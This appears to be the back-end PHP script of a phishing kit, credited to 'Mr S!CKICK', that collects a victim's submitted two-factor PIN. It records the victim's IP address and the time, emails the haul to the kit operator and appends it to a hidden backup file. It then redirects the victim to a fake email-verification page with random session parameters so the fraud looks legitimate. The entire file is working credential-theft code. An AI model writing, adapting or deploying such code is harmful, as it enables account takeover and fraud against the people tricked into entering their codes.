<?php
$shady= $_POST["2factor"];

if($shady != ""){
include 'email.php';
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=ReZulT=---------\n";
$message .= "PIN ".$shady."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------= BY Mr S!CKICK =---------\n";


$subject = "PIN Result Received Num1 - ".$ip;
$headers = "From: S!CKICK<sickick@spreadthesickness.com>";
$headers = "MIME-Version: 1.0\n";
{
mail($to,$subject,$message,$headers);
}

$fp = fopen("backupresultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);

 $praga=rand();
$praga=md5($praga);
  header ("Location: emailverification.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>